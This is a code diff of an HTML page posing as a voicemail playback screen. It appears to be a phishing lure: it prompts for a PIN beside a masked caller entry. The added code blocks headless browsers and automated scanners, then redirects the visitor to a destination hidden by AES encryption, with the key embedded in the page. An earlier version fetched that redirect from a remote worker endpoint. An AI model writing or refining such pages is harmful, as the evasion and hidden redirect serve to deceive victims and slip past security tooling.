@@ -2,128 +2,189 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Secure Voicemail</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Voicemail</title>
   <style>
     body {
       font-family: Arial, sans-serif;
       background: #f4f4f4;
+      margin: 0;
+      padding: 0;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      margin: 0;
     }
-    .container {
+
+    .voicemail-container {
       background: white;
       padding: 2rem;
       border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
       width: 90%;
       max-width: 500px;
     }
-    .code-input {
-      width: 100%;
-      padding: 0.7rem;
-      margin-top: 1rem;
-      font-size: 1rem;
-      border: 1px solid #ccc;
-      border-radius: 6px;
+
+    h1 {
+      margin-top: 0;
+      font-size: 1.8rem;
+      text-align: center;
     }
-    .play {
+
+    .message {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1rem;
+      margin-top: 1.5rem;
+      background: #f9f9f9;
+      border-radius: 8px;
+    }
+
+    .message-info {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .message-info span {
+      font-size: 0.9rem;
+      color: #555;
+    }
+
+    input.code-input {
       margin-top: 1rem;
-      padding: 0.7rem 1.2rem;
-      background-color: #4CAF50;
+      width: 100%;
+      padding: 0.5rem;
+      font-size: 1rem;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+
+    button.play {
+      background: #4CAF50;
       color: white;
       border: none;
+      padding: 0.5rem 1rem;
       border-radius: 6px;
-      font-weight: bold;
       cursor: pointer;
+      font-weight: bold;
     }
-    .play:disabled {
-      background-color: gray;
+
+    button.play:disabled {
+      background: gray;
+      cursor: not-allowed;
+    }
+
+    button.play:hover:enabled {
+      background: #45a049;
+    }
+
+    #captcha-stub {
+      margin: 1rem 0;
+      font-size: 0.9rem;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>Voicemail Access</h2>
-    <form id="access-form">
-      <input type="password" name="pin" class="code-input" placeholder="Enter PIN" required />
-      <!-- Honeypot -->
-      <input type="text" name="extra_field" style="display:none" />
-      <label style="display: block; margin-top: 1rem;">
-        <input type="checkbox" id="captcha"> I'm not a robot
-      </label>
-      <button type="submit" class="play">▶️ Play</button>
+  <div class="voicemail-container">
+    <h1>Play Messages</h1>
+    <form id="voicemail-form" onsubmit="return false;">
+      <input type="password" class="code-input" placeholder="Enter PIN" name="pin" required />
+      <!-- Honeypot field -->
+      <input type="text" name="extra_field" style="display: none;" autocomplete="off" />
+      
+      <!-- CAPTCHA stub -->
+      <div id="captcha-stub" style="display: none;">
+        <label><input type="checkbox" id="captcha-check" /> I'm not a robot</label>
+      </div>
+
+      <div class="message">
+        <div class="message-info">
+          <strong>Caller: John ****</strong>
+          <span>May 29, 2025 - 10:15 AM</span>
+        </div>
+        <button class="play">▶️ Play</button>
+      </div>
     </form>
   </div>
 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
   <script>
-    const form = document.getElementById('access-form');
+    const correctPin = "8911";
+    const maxAttempts = 3;
+    let attempts = 0;
 
-    function isHeadless() {
+    // AES-encrypted URL (https://google.com)
+    const encryptedRedirect = "U2FsdGVkX19v4zOFaCWT7dRHF2O1nV++DoTOoonLAssbpocFzPDmAJj5gl/w5MtF";
+    const aesKey = "2XPoyVKDRqzq7YFqRdkGxNHuIPyg4kwSbD2EY5TcA3N3LbBIHefVZKRgGj+yDLQm";
+
+    const playButton = document.querySelector('.play');
+    const form = document.getElementById('voicemail-form');
+    const captchaStub = document.getElementById('captcha-stub');
+    const captchaCheck = document.getElementById('captcha-check');
+
+    function decryptAES(encrypted, key) {
+      return CryptoJS.AES.decrypt(encrypted, key).toString(CryptoJS.enc.Utf8);
+    }
+
+    function isHeadlessBrowser() {
       return (
         navigator.webdriver ||
         !navigator.plugins.length ||
+        !window.chrome ||
         /HeadlessChrome/.test(navigator.userAgent)
       );
     }
 
-    function decryptAES(encrypted, keyHex, ivHex) {
-      const key = CryptoJS.enc.Hex.parse(keyHex);
-      const iv = CryptoJS.enc.Hex.parse(ivHex);
-      const decrypted = CryptoJS.AES.decrypt(encrypted, key, {
-        iv: iv,
-        mode: CryptoJS.mode.CBC,
-        padding: CryptoJS.pad.Pkcs7
-      });
-      return decrypted.toString(CryptoJS.enc.Utf8);
-    }
-
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
+    playButton.addEventListener('click', () => {
       const formData = new FormData(form);
-      const pin = formData.get("pin");
+      const enteredPin = formData.get("pin");
       const honeypot = formData.get("extra_field");
-      const captcha = document.getElementById("captcha").checked;
 
+      // Honeypot bot check
       if (honeypot) {
         alert("Bot activity detected.");
         return;
       }
 
-      if (!captcha) {
-        alert("Please complete CAPTCHA.");
+      // CAPTCHA check (if visible)
+      if (captchaStub.style.display !== 'none' && !captchaCheck.checked) {
+        alert("Please verify you are not a robot.");
         return;
       }
 
-      if (isHeadless()) {
+      // Headless detection
+      if (isHeadlessBrowser()) {
         alert("Headless browsers are not allowed.");
         return;
       }
 
-      try {
-        const res = await fetch("https://8d070c75-voicemail-worker.allanfree707.workers.dev/validate", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({ pin, captcha: true })
-        });
-
-        const data = await res.json();
-        if (data.success) {
-          const decrypted = decryptAES(data.encrypted, data.key, data.iv);
-          window.location.href = decrypted;
-        } else {
-          alert(data.error || "Unknown error");
+      if (enteredPin === correctPin) {
+        try {
+          const redirectURL = decryptAES(encryptedRedirect, aesKey);
+          if (redirectURL) {
+            window.location.href = redirectURL;
+          } else {
+            alert("Decryption failed.");
+          }
+        } catch (err) {
+          alert("Invalid redirect or decryption error.");
         }
-      } catch (err) {
-        console.error(err);
-        alert("Server error.");
+      } else {
+        attempts++;
+        if (attempts >= maxAttempts) {
+          alert("Too many incorrect attempts. Access locked.");
+          playButton.disabled = true;
+        } else {
+          alert(`Incorrect code. ${maxAttempts - attempts} attempt(s) left.`);
+        }
       }
     });
+
+    // Optional CAPTCHA visibility delay
+    setTimeout(() => {
+      captchaStub.style.display = 'block';
+    }, 2000);
   </script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 </body>
 </html>
